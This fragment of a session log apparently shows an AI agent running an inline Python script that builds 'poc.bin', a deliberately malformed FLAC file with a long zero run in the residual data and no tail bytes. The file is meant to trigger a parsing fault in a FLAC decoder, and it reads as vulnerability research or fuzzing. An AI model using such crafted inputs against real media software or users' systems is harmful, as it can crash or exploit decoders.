Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc.bin')
# Try a minimal malformed frame with huge unary run in residuals and nearly no tail bytes.
payload = bytearray(b'fLaC')
payload += bytes([0x00,0x00,0x00,0x22]) + b'\x00'*34
# frame sync, then minimal bytes to enter residual parse
payload += b'\xff\xf8\x69\x00\x00\x00\x00\x00'
# long zero run ending with a single one, then no more data
payload += b'\x00' * 8192 + b'\x01'
p.write_bytes(payload)
print('len', len(payload))
